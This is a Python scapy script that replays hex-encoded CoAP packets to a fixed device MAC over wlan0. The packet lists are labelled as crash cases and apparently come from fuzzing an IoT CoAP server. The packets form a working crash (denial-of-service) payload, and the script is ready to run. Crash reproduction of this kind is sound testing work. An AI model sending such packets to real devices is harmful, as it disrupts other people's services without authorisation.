import scapy.all as scapy
import time
from binascii import unhexlify

def verify_lst(lst):
    count = 2
    for idx, pkt in enumerate(lst):
        # time.sleep(3)
        print("Packet: ", idx)
        while(count > 1):
            frame = scapy.Ether(unhexlify(pkt))
            frame[scapy.Ether].src ='00:d4:9e:83:48:d9'
            frame[scapy.Ether].dst = 'a8:03:2a:eb:f5:20'
            # pkt[IP].src = "10.42.0.100"
            # pkt[IP].dst = "10.47.0.156"
            
            del frame[scapy.IP].chksum
            del frame[scapy.UDP].chksum
            scapy.sendp(frame,iface = 'wlan0')
            time.sleep(0.5)
            count = count - 1
            print(count)
            # time.sleep(1)
        count = 2

packet_lst_coap_crash1 = [
                    # "ecf1f8d5476becf1f8d5476b08004500004bced240004011568e0a2f00010a2a00e896a4163300371af14803c01eeb1187a07109797ab94573707265737369661100d10208d11410ff68686868686868686868686868686868",
                    "ecf1f8d5476becf1f8d5476b08004500004bced240004011568e0a2f00010a2a00e896a4163300371af14803c01eeb1187a07109797ab94573707265737369661100d10208d15410ff68686868686868686868686868686868",
                    "ecf1f8d5476becf1f8d5476b080045000047d836400040114d2e0a2f00010a2a00e896a416330033484c4803c02a591187a8deb9b733b94573707265737369661100d10200d11410ff686868686868686868686868",
]

packet_lst_coap_crash_6 = ["ecf1f8d5476becf1f8d5476b08004500004b33d740004011f1890a2f00010a2a00e8b95016330037f7284803af20f5b3801c609f98e0b94573707265737369661100d10208d18c10ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b370f40004011ee510a2f00010a2a00e8b95016330037e7214803af27f5b3801c609f98e0b94573707265737369661100d10218d1147aff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b4c6040004011d9000a2f00010a2a00e8b9501633003749644803af501eb38039a774ff82b94573707265737369661100d10210d11410ff68686868686868686868686868686868"]

# from packet 257304 to 257141
packet_lst_coap_crash_5 = ["ecf1f8d5476becf1f8d5476b08004500004bbd734000401167ed0a2f00010a2a00e8b95016330037419d48039b25f5b37249a6802a59b94573707265737369661100d10208d16010ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b080045000044c701400040115e660a2f00010a2a00e8b95016330030ccc348036230f5b372537e8b705ab94573707265737369661100d10200d11410ff686868686868686868"]

# packets from 224101 to 223976
packet_lst_coap_crash_4 = ["ecf1f8d5476becf1f8d5476b08004500004babfa4000401179660a2f00010a2a00e8b95016330037c44148037886f5b35ac49924ef34b94573707265737369661100d10208d13810ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b080045000045af664000401176000a2f00010a2a00e8b95016330031047c48037c92f5b35ac0db695df2b94573707265737369661100d10250e21410ff68686868686868686868"]

# packets from 57646 to 57443 (have to be 4 packets interesting)
packet_lst_coap_crash_3 = ["ecf1f8d5476becf1f8d5476b08004500004b27b440004011fdac0a2f00010a2a00e8b95016330037ef6b4803cab2f5b2e590f2288e0eb94573707265737369661100d10208d1bc10ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b311440004011f44c0a2f00010a2a00e8b950163300377a3c4803cac3d4b2e59997f63d56b94573707265737369661100d10228d11410ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b423440004011e32c0a2f00010a2a00e8b95016330037d4a848032ddff5b2e5af132b7783b94573707265737369661100d10218d11410ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b59af40004011cbb10a2f00010a2a00e8b950163300374f294803cb0cf5b2e5c2062f09bfb94573707265737369661100d10225d11410ff68686868686868686868686868686868"]

packet_lst_coap_crash_2 = ["ecf1f8d5476becf1f8d5476b08004500004b287640004011fcea0a2f00010a2a00e896a416330037d63c4803a102eb11718eef9974ccb94573707265737369661100d10208d14410ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b0800450000494c8540004011d8dd0a2f00010a2a00e896a416330035d9164803a143eb1171b6a7f82997b94573707265737369661100d10200d11410ff6868686868686868686868686868"]


count = 1
while(count>0):
    verify_lst(packet_lst_coap_crash1)
    count = count -1
